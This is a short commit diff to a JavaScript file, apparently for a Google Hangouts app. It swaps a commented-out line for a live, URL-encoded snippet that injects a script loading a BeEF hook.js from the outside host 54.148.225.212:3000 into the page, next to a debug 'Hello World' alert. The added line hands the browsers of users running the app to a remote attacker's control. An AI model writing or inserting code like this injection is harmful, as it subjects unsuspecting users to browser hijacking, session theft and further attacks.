833046a1bdd9ad3c1e415e50cdf6f6684eddf301
730 <leonardo>
2015-05-04 01:04:00 -0500

    changin

--- ggs/yesnomaybe.js
+++ ggs/yesnomaybe.js
@@ -254,8 +254,8 @@ function onAnswer(newAnswer) {
   alert("Hello World we are in action !!")
 
 
-//  %20(function%20()%20{%20var%20url%20=%20%27http:%2f%2f54.148.225.212:3000%2fhook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%  20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();
 
+javascript:%20(function%20()%20{%20var%20url%20=%20%27http:%2f%2f54.148.225.212:3000%2fhook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();
    
   var myId = getUserHangoutId();
 
